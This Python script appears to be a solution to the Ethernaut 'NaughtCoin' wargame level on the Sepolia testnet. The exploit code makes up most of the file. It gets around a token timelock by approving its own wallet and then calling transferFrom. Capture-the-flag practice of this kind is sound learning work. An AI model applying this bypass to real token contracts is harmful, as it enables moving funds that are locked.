import os

import solcx
from dotenv import load_dotenv
from web3 import Web3

load_dotenv()

w3 = Web3(Web3.HTTPProvider(os.getenv('PROVIDER_URL')))
if w3.is_connected():
    print("Successfully connected to Sepolia via provider!")
else:
    print("Failed to connect to Sepolia via provider.")
    exit()

# Load environment variables
_PRIVATE_KEY = os.getenv('PRIVATE_KEY')
_WALLET = w3.to_checksum_address(os.getenv('WALLET'))


def compile_contract(contract_path: str, version: str, contract_name: str = None):
    solcx.set_solc_version(version=version)
    with open(contract_path, 'r') as file:
        contract_source = file.read()

    compiled_sol = solcx.compile_source(contract_source)
    if contract_name is None:
        contract_key = next(iter(compiled_sol))
    else:
        contract_key = f'<stdin>:{contract_name}'
    contract_interface = compiled_sol[contract_key]
    print(f'Compiled {contract_path} for contract {contract_key}')
    return contract_interface


def send_transaction_and_wait(transaction):
    transaction = transaction.build_transaction({
        'from': _WALLET,
        'chainId': 11155111,  # sepolia testnet chain id
        'nonce': w3.eth.get_transaction_count(w3.to_checksum_address(_WALLET))
    })
    signed_tx = w3.eth.account.sign_transaction(transaction, private_key=_PRIVATE_KEY)

    txn_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
    assert tx_receipt['status'] == 1
    return tx_receipt
    # print(f'Attack is sent {minimal_tx(tx_receipt)}')


# Load Ethernaut deployed contract
_ethernaut_deployed_address = w3.to_checksum_address("")
compiled_contract = compile_contract('./NaughtCoin.sol', '0.8.0')
erc_contract = w3.eth.contract(address=_ethernaut_deployed_address, abi=compiled_contract['abi'])

tokens_to_approve = erc_contract.functions.balanceOf(_WALLET).call()
assert tokens_to_approve > 0

# Approve ourself to transfer the tokens
send_transaction_and_wait(erc_contract.functions.approve(_WALLET, tokens_to_approve))
print('approve success')

# Transfer tokens from our self to another address (bypasses timeLock)
send_transaction_and_wait(erc_contract.functions.transferFrom(
    _WALLET, "0xe38866255987983435C563A2eB4d95877acdd1DE", tokens_to_approve
))
print('transferFrom success')

# Check if balance is now zero
final_balance = erc_contract.functions.balanceOf(_WALLET).call()
assert final_balance == 0, f"Expected 0 tokens after transfer, got {final_balance}"
print('You have completed this level!!!')
